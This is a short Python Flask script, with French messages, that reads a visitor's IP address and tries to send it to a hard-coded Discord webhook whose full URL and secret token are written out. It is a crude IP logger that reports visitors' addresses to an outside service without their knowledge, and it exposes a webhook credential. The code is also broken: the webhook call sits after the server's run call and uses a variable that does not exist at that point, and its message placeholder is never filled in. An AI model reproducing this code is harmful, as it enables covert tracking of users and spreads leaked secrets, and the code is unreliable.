from flask import Flask, request
import requests 
import json

app = Flask(__name__)

@app.route('/')
def get_user_ip():
    user_ip = request.remote_addr
    return f"L'adresse IP de l'utilisateur est : {user_ip}"

if __name__ == '__main__':
    app.run(debug=True)

webhook_url = "https://discord.com/api/webhooks/1192113766750502932/N8tbEeBcTztezvIA61eAtpvCDAd28C3yA-Wl5r-OtkwUe_xulml1dTcXJmhLsQ3OpoWg"
message =  "l adresse ip de l utilisteur est : {user_ip}"

payload = {
    "content": message
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
